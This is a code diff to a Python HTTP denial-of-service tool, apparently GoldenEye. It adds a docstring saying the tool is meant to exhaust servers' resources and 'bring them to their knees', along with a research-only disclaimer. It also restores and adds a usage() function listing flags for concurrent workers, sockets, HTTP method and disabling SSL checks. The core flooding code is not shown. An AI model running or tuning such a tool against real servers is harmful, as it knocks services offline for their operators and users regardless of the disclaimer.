@@ -1,5 +1,20 @@
 """
+This tool is a dos tool that is meant to put heavy load on HTTP servers
+in order to bring them to their knees by exhausting the resource pool.
 
+This tool is meant for research purposes only
+and any malicious usage of this tool is prohibited.
+
+@author Jan Seidl <http://wroot.org/>
+
+@date 2014-02-18
+@version 2.1
+
+LEGAL NOTICE:
+THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!
+IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY
+THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
+BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
 """
 import sys, random, getopt, ssl
 
@@ -415,7 +430,7 @@ class Striker(Process):
 def error(msg):
     # print help information and exit:
     sys.stderr.write(str(msg + "\n"))
-    # usage()
+    usage()
     sys.exit(2)
 
 
@@ -432,7 +447,7 @@ def main():
         url = sys.argv[1]
 
         if url == '-h':
-            # usage()
+            usage()
             sys.exit()
 
         if url[0:4].lower() != 'http':
@@ -442,7 +457,7 @@ def main():
             error("No URL supplied")
 
         opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:",
-                                   ["nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents"])
+                                   ["nosslcheck", "debug", "help", "workers", "sockets", "method", "strings-files"])
 
         workers = DEFAULT_WORKERS
         socks = DEFAULT_SOCKETS
@@ -453,9 +468,9 @@ def main():
 
         for o, a in opts:
             if o in ("-h", "--help"):
-                # usage()
+                usage()
                 sys.exit()
-            elif o in ("-u", "--useragents"):
+            elif o in ("-u", "--strings-files"):
                 uas_file = a
             elif o in ("-s", "--sockets"):
                 socks = int(a)
@@ -494,5 +509,26 @@ def main():
 
         # print help information and exit:
         sys.stderr.write(str(err))
-        # usage()
+        usage()
         sys.exit(2)
+
+
+def usage():
+    print()
+    print('-----------------------------------------------------------------------------------------------------------')
+    print()
+    print(PLATINUM_EYE_BANNER)
+    print()
+    print( ' USAGE: ./goldeneye.py <url> [OPTIONS]')
+    print()
+    print( ' OPTIONS:')
+    print( '\t Flag\t\t\tDescription\t\t\t\t\t\tDefault')
+    print( '\t -u, --strings-files\tFile with user-agents to use\t\t\t\t(default: randomly generated)')
+    print( '\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS))
+    print( '\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS))
+    print( '\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)')
+    print( '\t -n, --nosslcheck\tDo not verify SSL Certificate\t\t\t\t(default: True)')
+    print( '\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)')
+    print( '\t -h, --help\t\tShows this help')
+    print()
+    print( '-----------------------------------------------------------------------------------------------------------')
